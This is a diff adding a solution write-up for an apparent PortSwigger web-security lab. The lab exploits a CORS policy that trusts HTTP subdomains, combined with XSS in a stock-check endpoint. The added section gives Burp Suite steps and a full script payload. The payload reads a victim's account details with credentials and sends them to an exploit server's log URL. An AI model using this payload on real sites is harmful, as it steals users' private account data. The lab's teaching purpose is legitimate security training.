@@ -103,6 +103,22 @@ Reference: https://portswigger.net/web-security/cors/lab-breaking-https-attack
 
 <!-- omit in toc -->
 ### Quick Solution
+This website has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol. There is also a vulnerable subdomain endpoint used to check the stock that is vulnerable to XSS. This endpoint can be leveraged to exfiltrate date frmo the main domain. In the exploit server we just have to redirect the user to the vulnerable subdomain and perform XSS on it, see next paragraph for Solution.
 
 <!-- omit in toc -->
 ### Solution
+1. With your browser proxying through Burp Suite, check intercept is off then log in and access your account page.
+2. Review the history and observe that your key is retrieved via an AJAX request to ``/accountDetails``, and the response contains the ``Access-Control-Allow-Credentials`` header suggesting that it may support CORS.
+3. Send the request to Burp Repeater, and resubmit it with the added header ``Origin: http://subdomain.lab-id`` where ``lab-id`` is the lab domain name.
+4. Observe that the origin is reflected in the ``Access-Control-Allow-Origin`` header, confirming that the CORS configuration allows access from arbitrary subdomains, both HTTPS and HTTP.
+5. Open a product page, click "Check stock" and observe that it is loaded using a HTTP URL on a subdomain.
+6. Observe that the ``productID`` parameter is vulnerable to XSS.
+7. In your browser, go to the exploit server and enter the following HTML, replacing ``$your-lab-url`` with your unique lab URL and ``$exploit-server-url`` with your exploit server URL:
+```
+<script>
+   document.location="http://stock.$your-lab-url/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://$your-lab-url/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://$exploit-server-url/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+</script>
+```
+
+
+
